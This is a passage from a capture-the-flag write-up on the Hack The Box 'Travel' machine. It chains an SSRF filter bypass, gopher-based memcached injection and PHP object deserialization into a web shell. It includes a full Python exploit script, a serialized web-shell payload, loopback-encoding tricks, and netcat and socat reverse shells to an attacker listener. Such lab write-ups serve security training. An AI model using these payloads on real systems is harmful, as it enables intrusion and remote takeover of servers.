*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> <span class="keyword">instanceof</span> SimplePie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$data</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span></span><br><span class="line">        -&gt;cache</span><br><span class="line">        -&gt;set(<span class="keyword">$this</span>-&gt;name, serialize(<span class="variable">$data</span>) , MEMCACHE_COMPRESSED, (<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;extras&#x27;</span>][<span class="string">&#x27;timeout&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve the data saved to the cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array Data for SimplePie::$data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">$this</span></span><br><span class="line">        -&gt;cache</span><br><span class="line">        -&gt;get(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> !== <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This make perfect sense with the output of <code>debug.php</code> that very probably show the lasted entry added (or loaded) from <code>memcached</code>:</p><ul><li>Key: <code>xct_a0e937ab19(...)</code></li><li>Content: <code>a:4:&#123;s:5:&quot;child&quot;;a:1:&#123;s:0:&quot;&quot;;a:1:&#123;(...)</code></li></ul><p>And now we can see how we could potentially exploit this flow…</p><h3 id="Object-Deserialization-Vulnerability"><a href="#Object-Deserialization-Vulnerability" class="headerlink" title="Object Deserialization Vulnerability"></a>Object Deserialization Vulnerability</h3><p>If you remember, in <code>template.php</code> we have this <code>TemplateHelper</code> Object:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/logs/&#x27;</span>.<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>If we find a way to create a new instance of <code>TemplateHelper()</code> we could actually exploit the <code>file_put_contents()</code> to write a web-shell to  <code>wp-content/themes/twentytwenty/logs/</code>. Like so:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">&quot;TemplateHelper.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;hg8.php&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> TemplateHelper(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure><p>That’s exactly what we need with the behaviour of <code>SimplePie</code> we found earlier. Let me explain.</p><ol><li><p><code>SimplePie</code> stores, for each RSS feed, a <code>memcached</code> entry containing serialized PHP. </p></li><li><p>Upon loading an RSS feed already cached before, <code>SimplePie</code> will take the <code>memcached</code> entry and unserialize the data with:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>By storing a malicious serialized <code>TemplateHelper()</code> object (the one shown above) in the right <code>memcached</code> entry, <code>SimplePie</code> will execute it during the unserialize process (as know as <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization">Insecure Deserialization Vulnerability</a>). This will write our web-shell to the server.</p></li></ol><p>Sounds all good. Yet we are missing one point: <em>How to write our malicious <code>memcached</code> entry ?</em></p><p>That’s where the SSRF vulnerability we found earlier come to play :) </p><h3 id="SimplePie-Memcached-Key"><a href="#SimplePie-Memcached-Key" class="headerlink" title="SimplePie Memcached Key"></a>SimplePie Memcached Key</h3><p>First of all, we need to make sure to write our malicious payload to a <code>memcached</code> entry that <code>SimplePie</code> will deserialize.</p><p>By the code we know for sure that the default RSS feed (<code>http://www.travel.htb/newsfeed/customfeed.xml</code>) is stored in <code>memcached</code> and loaded when we open <code>Awesome RSS</code> without extra parameters. </p><p>Knowing this the best way to go would be to overwrite <code>customfeed.xml</code> <code>memcached</code> entry with our malicious payload. </p><p>The syntax to update a <code>memcached</code> entry is the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set key flags exptime bytes [noreply]  </span><br><span class="line">value </span><br></pre></td></tr></table></figure><p>But an issue arise. How can we find the <code>memcached</code> key used by <code>SimplePie</code>?</p><p>Well we saw earlier from the <a href="https://simplepie.org/api/source-class-SimplePie_Cache_Memcache.html#102">source code</a> that key is the following format:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(feed_url + <span class="string">&quot;:spc&quot;</span>)</span><br></pre></td></tr></table></figure><p>So for <code>http://www.travel.htb/newsfeed/customfeed.xml</code> it should gives us the following MD5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">print</span> md5(<span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span> . <span class="string">&quot;:spc&quot;</span>);</span><br><span class="line"><span class="number">15</span>f4a13c9f97c9c2cf6791a16d4fa683</span><br></pre></td></tr></table></figure><p>Yet that doesn’t match the entry shown by the <code>debug.php</code> page:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/awesome-rss/?debug&quot;</span> -s &gt; /dev/null</span><br><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php </span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">| xct_4e5612ba07(...) | a:4:&#123;s:5:<span class="string">&quot;child&quot;</span>;a:1:&#123;s:0:<span class="string">&quot;&quot;</span>;a:1:&#123;(...) |</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure><p>By digging a bit more in the source code we found that another <code>MD5</code> is being made on top of the previous one. Creating the hash this way: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://simplepie.org/api/source-class-SimplePie.html#1266</span></span><br><span class="line">MD5(MD5(feed_url + <span class="string">&quot;:spc&quot;</span>))</span><br></pre></td></tr></table></figure><p>So for <code>http://www.travel.htb/newsfeed/customfeed.xml</code> it should gives us the following MD5 as <code>memcached</code> key:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">print</span> md5(md5(<span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>) . <span class="string">&quot;:spc&quot;</span>);</span><br><span class="line"><span class="number">4e5612</span>ba079c530a6b1f148c0b352241</span><br></pre></td></tr></table></figure><p>Bingo! That match the partiel key we got from <code>debug.php</code>. We now have the <code>memcached</code> key for the entry we want to overwrite.</p><h3 id="Memcached-injection"><a href="#Memcached-injection" class="headerlink" title="Memcached injection"></a>Memcached injection</h3><p>Alright that’s a lot of informations so far but we slowly manage to get all the pieces together right ?</p><img width="500" alt="travel" src="https://user-images.githubusercontent.com/9076747/83969018-80bf3c80-a8cd-11ea-8f14-e1ca4cf8ad92.jpg"><p>We have:</p><ul><li>Our malicious serialized PHP payload to drop a web-shell.</li><li>The <code>memcached</code> entry to inject our payload to.</li><li>SSRF</li></ul><p>It now seems straightforward to use server-side request forgery in order to inject our payload to <code>memcached</code> (running on internal port <code>11211</code>). </p><h4 id="Bypassing-SSRF-protection"><a href="#Bypassing-SSRF-protection" class="headerlink" title="Bypassing SSRF protection"></a>Bypassing SSRF protection</h4><blockquote><p>But wait… Didn’t we saw SSRF protection in <code>Template.php</code>?</p></blockquote><p>Let’s take a look at it:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tmp</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"><span class="comment">// preventing all localhost access</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$tmp</span> == <span class="string">&quot;localhost&quot;</span> <span class="keyword">or</span> <span class="variable">$tmp</span> == <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$url</span>;</span><br></pre></td></tr></table></figure><p>Well that’s quite weak protection and there is more than a way to bypass it:</p><ol><li><p>Since it’s using a weak comparison we could simply use capital “LOCALHOST” or even “localHost”:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="string">&quot;localhost&quot;</span> == <span class="string">&quot;LOCALHOST&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(<span class="string">&quot;localhost&quot;</span> == <span class="string">&quot;localhOst&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li><li><p>And then well we have plenty of other ways to call on localhost that is not <code>localhost</code> nor <code>127.0.0.1</code>. Here is a few possible way:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl 127.0.0.1</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0.0.0.0</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 127.1</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl  0177.0000.0000.0001</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0x7F000001</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 2130706433</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 127.00.00.1</span><br><span class="line">hello from localhost!</span><br></pre></td></tr></table></figure></li><li><p>Using a domain name which DNS record pointing to <code>127.0.0.1</code> like <code>http://localtest.me</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://localtest.me/</span><br><span class="line">hello from localhost!</span><br></pre></td></tr></table></figure></li></ol><p>As you can see it shouldn’t be hard to bypass this SSRF protection. From now on I will use <code>127.1</code>.</p><h4 id="Memcached-And-Gopher-Protocol"><a href="#Memcached-And-Gopher-Protocol" class="headerlink" title="Memcached And Gopher Protocol"></a>Memcached And Gopher Protocol</h4><p>Another problem arise, using HTTP to inject <code>memcached</code> payload probably won’t work since <code>HTTP</code> need a specific format to be valid (like <code>host</code> and a bunch of carriage return). </p><p> <code>memcached</code> protocol needs data to includes sequences of commands and data ending by two CRLF:</p><blockquote><p>There are two kinds of data sent in the memcache protocol: text lines<br>and unstructured data.  Text lines are used for commands from clients<br>and responses from servers. Unstructured data is sent when a client<br>wants to store or retrieve data. The server will transmit back<br>unstructured data in exactly the same way it received it, as a byte<br>stream. The server doesn’t care about byte order issues in<br>unstructured data and isn’t aware of them. There are no limitations on<br>characters that may appear in unstructured data; however, the reader<br>of such data (either a client or a server) will always know, from a<br>preceding text line, the exact length of the data block being<br>transmitted.</p><p>Text lines are always terminated by \r\n. Unstructured data is <em>also</em><br>terminated by \r\n, even though \r, \n or any other 8-bit characters<br>may also appear inside the data. Therefore, when a client retrieves<br>data from a server, it must use the length of the data block (which it<br>will be provided with) to determine where the data block ends, and not<br>the fact that \r\n follows the end of the data block, even though it<br>does.</p></blockquote><p>A workaround to this format issue is to use the <code>gopher://</code> protocol instead of <code>http://</code>:</p><blockquote><p>The Gopher protocol is a communications protocol designed for distributing, searching, and retrieving documents in Internet Protocol networks. The design of the Gopher is presented as an alternative to the World Wide Web in its early stages, but ultimately fell into disfavor, yielding to the Hypertext Transfer Protocol (HTTP). </p><p><a href="https://en.wikipedia.org/wiki/Gopher_(protocol)">https://en.wikipedia.org/wiki/Gopher_(protocol)</a></p></blockquote><p>While not being widely used, Gopher is still supported by <code>curl</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man curl</span><br><span class="line">DESCRIPTION</span><br><span class="line">       curl  is  a tool to transfer data from or to a server, using one of the supported protocols</span><br><span class="line">       (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT,  POP3,  POP3S,</span><br><span class="line">       RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP). The <span class="built_in">command</span> is designed to</span><br><span class="line">       work without user interaction.</span><br></pre></td></tr></table></figure><p>Alright! We those informations we can start creating our <code>memcached</code> command to inject on the server.</p><p>First let’s create our serialized PHP web-shell payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">require</span>(<span class="string">&quot;TemplateHelper.php&quot;</span>);</span><br><span class="line">php &gt; <span class="variable">$file</span> = <span class="string">&#x27;hg8.php&#x27;</span>;</span><br><span class="line">php &gt; <span class="variable">$data</span> = <span class="string">&#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line">php &gt; <span class="variable">$o</span> = <span class="keyword">new</span> TemplateHelper(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">php &gt; <span class="keyword">echo</span> serialize(<span class="variable">$o</span>);</span><br><span class="line">O:<span class="number">14</span>:<span class="string">&quot;TemplateHelper&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;hg8.php&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">31</span>:<span class="string">&quot;&lt;?php system(<span class="subst">$_REQUEST</span>[&quot;</span>cmd<span class="string">&quot;]);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>Now we can create the <code>memcached</code> command we need to execute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set xct_4e5612ba079c530a6b1f148c0b352241 4 0 131</span><br><span class="line">O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:7:&quot;hg8.php&quot;;s:4:&quot;data&quot;;s:31:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&quot;;&#125;</span><br></pre></td></tr></table></figure><p>URL Encoding this command and send it through <code>curl</code> using <code>gopher://</code> protocol should work. Let’s give it a try and get our answer :) </p><h3 id="Chaining-vulnerabilities-for-RCE"><a href="#Chaining-vulnerabilities-for-RCE" class="headerlink" title="Chaining vulnerabilities for RCE"></a>Chaining vulnerabilities for RCE</h3><p>We have quite a few vulnerabilities to chain in order to achieve Remote Code execution. We need to:</p><p><strong>SSRF</strong> -&gt; <strong>Memcached Injection</strong> -&gt; <strong>Object Deserialization</strong> -&gt; <strong>Arbitrary File Write</strong></p><p>Since it’s going to be a pain let’s write a script to pull the exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://blog.travel.htb/&quot;</span></span><br><span class="line">shell = <span class="string">&quot;hg8.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_payload</span>():</span></span><br><span class="line">    len_shell = <span class="built_in">str</span>(<span class="built_in">len</span>(shell))</span><br><span class="line">    php_obj = <span class="string">&#x27;O:14:&quot;TemplateHelper&quot;:2:&#123;s:4:&quot;file&quot;;s:&#x27;</span>+len_shell+<span class="string">&#x27;:&quot;&#x27;</span>+shell+<span class="string">&#x27;&quot;;s:4:&quot;data&quot;;s:31:&quot;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&quot;;&#125;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    len_php_obj = <span class="built_in">len</span>(php_obj)</span><br><span class="line">    memcached_cmd = <span class="string">f&quot;\r\nset xct_4e5612ba079c530a6b1f148c0b352241 0 0 <span class="subst">&#123;len_php_obj&#125;</span>\r\n<span class="subst">&#123;php_obj&#125;</span>\r\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Memcached command to run: <span class="subst">&#123;memcached_cmd&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    encoded_payload = urllib.parse.quote(memcached_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;gopher://127.1:11211/<span class="subst">&#123;encoded_payload&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inject_payload</span>(<span class="params">payload</span>):</span></span><br><span class="line">    ssrf_payload = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>awesome-rss/?debug&amp;custom_feed_url=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+]Final SSRF Payload: <span class="subst">&#123;ssrf_payload&#125;</span>\n&quot;</span>)</span><br><span class="line">    r = requests.get(ssrf_payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deserialize</span>():</span></span><br><span class="line">    requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>awesome-rss/&quot;</span>)</span><br><span class="line">    webshell_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>wp-content/themes/twentytwenty/logs/<span class="subst">&#123;shell&#125;</span>&quot;</span></span><br><span class="line">    webshell = requests.get(webshell_url)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Checking for <span class="subst">&#123;shell&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> webshell.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] File found! Injection successful.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = generate_payload()</span><br><span class="line">    inject_payload(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        deserialize()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>Let’s run it to see if everything goes fine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python exploit-test.py</span><br><span class="line">[+] Memcached <span class="built_in">command</span> to run:</span><br><span class="line"><span class="built_in">set</span> xct_4e5612ba079c530a6b1f148c0b352241 0 0 101</span><br><span class="line">O:14:<span class="string">&quot;TemplateHelper&quot;</span>:2:&#123;s:4:<span class="string">&quot;file&quot;</span>;s:7:<span class="string">&quot;hg8.php&quot;</span>;s:4:<span class="string">&quot;data&quot;</span>;s:31:<span class="string">&quot;&lt;?php system(<span class="variable">$_REQUEST</span>[&quot;</span>cmd<span class="string">&quot;]);&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">[+] Final SSRF Payload: </span><br><span class="line">http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=gopher://127.1:11211/%0D%0Aset%20xct_4e5612ba079c530a6b1f148c0b352241%200%200%20101%0D%0AO%3A14%3A%22TemplateHelper%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A7%3A%22hg8.php%22%3Bs%3A4%3A%22data%22%3Bs%3A31%3A%22%3C%3Fphp%20system%28%24_REQUEST%5B%22cmd%22%5D%29%3B%22%3B%7D%0D%0A</span><br><span class="line"></span><br><span class="line">[+] Checking <span class="keyword">for</span> hg8.php</span><br><span class="line">[*] File found! Injection successful.</span><br></pre></td></tr></table></figure><p>Bingo it worked! </p><h3 id="Upgrade-Web-Shell-with-Socat"><a href="#Upgrade-Web-Shell-with-Socat" class="headerlink" title="Upgrade Web-Shell with Socat"></a>Upgrade Web-Shell with Socat</h3><p>Alright now we have our web-shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/wp-content/themes/twentytwenty/logs/hg8.php?cmd=id&quot;</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>Let’s open a reverse shell to upgrade to a more stable shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/wp-content/themes/twentytwenty/logs/hg8.php?cmd=nc%20-e%20/bin/bash%2010.10.10.10%208585&quot;</span> </span><br></pre></td></tr></table></figure><p>And we get a new connection to open on our listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.189:47778</span><br></pre></td></tr></table></figure><p>Unfortunately there is no <code>python</code> nor <code>python3</code> installed on the box allowing us to upgrade our shell. Thankfully after a bit of search we found out <code>socat</code> is installed. Let’s upgrade our shell using it:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.189:47778</span><br><span class="line">$ <span class="built_in">which</span> python</span><br><span class="line"><span class="built_in">which</span> python3</span><br><span class="line">$ <span class="built_in">which</span> socat</span><br><span class="line">/usr/bin/socat</span><br><span class="line">$ socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444</span><br></pre></td></tr></table></figure><p>Now we have a proper shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 4444</span><br><span class="line">Listening on any address 4444 (krb524)</span><br><span class="line">Connection from 10.10.10.189:33944</span><br><span class="line">www-data@blog:/var/www/html/wp-content/themes/twentytwenty/logs$</span><br><span class="line">www-data@blog:/$</span><br></pre></td></tr></table></figure><p>What a ride! Let’s see what’s next.</p><h3 id="Pivot-www-data-gt-lynik-admin"><a 